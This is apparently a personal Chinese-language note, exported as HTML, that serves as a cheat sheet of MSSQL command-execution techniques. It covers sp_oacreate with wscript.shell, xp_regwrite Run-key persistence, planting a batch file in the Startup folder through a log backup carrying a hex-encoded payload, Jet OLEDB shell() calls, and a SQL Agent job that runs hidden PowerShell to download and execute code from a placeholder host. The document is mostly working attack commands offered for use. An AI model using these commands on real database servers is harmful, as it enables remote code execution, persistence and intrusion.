<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>mssql其他方式执行cmd</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>mssql其他方式执行cmd</h1><br/>Wscript.shell<br /><br />开启&#39;sp_oacreate&#39;支持: <br />exec sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;exec sp_configure &#39;Ole Automation Procedures&#39;,1;RECONFIGURE;<br /><br /><br />Declare @runshell INT<br />Exec SP_OACreate &#39;wscrip.shell&#39;,@runshell out<br />Exec SP_OAMETHOD @runshell,&#39;run&#39;,null,&#39;ren C:\Users\xiaohao\Desktop\2.txt 1.txt&#39;<br /><br />无回显<br /><br /><br /><br /><br /><br /><br /><br />注册表启动项<br /><br />xp_regwrite &#39;HKEY_LOCAL_MACHINE&#39;,&#39;SOFTWARE\Microsoft\Windows\currentversion\run&#39;,&#39;exec&#39;,&#39;REG_SZ&#39;,&#39;命令&#39;<br /><br /><br />备份添加启动项:<br /><br /><br />alter database test set RECOVERY FULL-- (把SQL设置成日志完全恢复模式)<br />create table cmd (a image)--  (新建立一个cmd表)<br />backup database test  to disk = &#39;D:\\temp\\cmd&#39;  WITH init --<br />backup log test to disk = &#39;D:\\temp\\cmd1&#39;  WITH init --  (减少备分数据的大小)<br />insert into cmd (a) values (0x0a406563686f206f66660d0a406563686f206f66660d0a40636d642e657865202f63206563686f2077686f616d69203e643a5c74656d705c332e7478740d0a40636d642e657865202f63206563686f2077686f616d69203e643a5c74656d705c332e7478740d0a400d0a40)<br />-- (插入cmd命令)<br />backup log test to disk = &#39;C:\\Documents and Settings\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\1.bat&#39;-- (备分日志到启动路径）<br />drop table cmd --(删除新建的cmd表）<br />alter database test set RECOVERY SIMPLE--(把SQL设置成日志简单恢复模式)<br /><br /><br /><br />上面的cmd命令为<br /><br />@echo off<br />@echo off<br />@cmd.exe /c echo whoami &gt;d:\temp\3.txt<br />@cmd.exe /c echo whoami &gt;d:\temp\3.txt<br />@<br />@<br />的16进制<br /><br /><br />成功率不高<br /><br /><br /><br /><br /><br /><br /><br /><br /><br />沙盒模式<br /><br />开启&#39;OPENROWSET&#39;支持:<br />exec sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;exec sp_configure &#39;Ad Hoc Distributed Queries&#39;,1;RECONFIGURE; <br />不知道有没有用<br /><br />开启沙盒<br />exec master.dbo.xp_regwrite &#39;HKEY_LOCAL_MACHINE&#39;,&#39;SOFTWARE\Microsoft\Jet\4.0\Engines&#39;,&#39;SandBoxMode&#39;,&#39;REG_DWORD&#39;,1 或 0 不知道那个正确<br /><br />然后利用jet.oledb执行命令：<br /><br />select * from openrowset(&#39;microsoft.jet.oledb.4.0&#39;,&#39;;database=c:\windows\system32\ias\dnary.mdb&#39;,&#39;select shell(&quot;whoami&quot;)&#39;)<br /><br />本机上没有执行成功<br /><br /><br /><br /><br /><br /><br /><br /><br /><br />通过Agent Job执行命令<br /><br />USE msdb; EXEC dbo.sp_add_job @job_name = N&#39;test_powershell_job1&#39; ; EXEC sp_add_jobstep @job_name = N&#39;test_powershell_job1&#39;, @step_name = N&#39;test_powershell_name1&#39;, @subsystem = N&#39;PowerShell&#39;, @command = N&#39;powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;&#39;<br /><br /><a href="http://IP_OR_HOSTNAME/file">http://IP_OR_HOSTNAME/file</a><br /><br />&#39;&#39;))&quot;&#39;, @retry_attempts = 1, @retry_interval = 5 ;EXEC dbo.sp_add_jobserver @job_name = N&#39;test_powershell_job1&#39;; EXEC dbo.sp_start_job N&#39;test_powershell_job1&#39;;<br /><br /><br /><br /><br /><br /><a href="http://www.4hou.com/technology/3338.html">http://www.4hou.com/technology/3338.html</a><p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>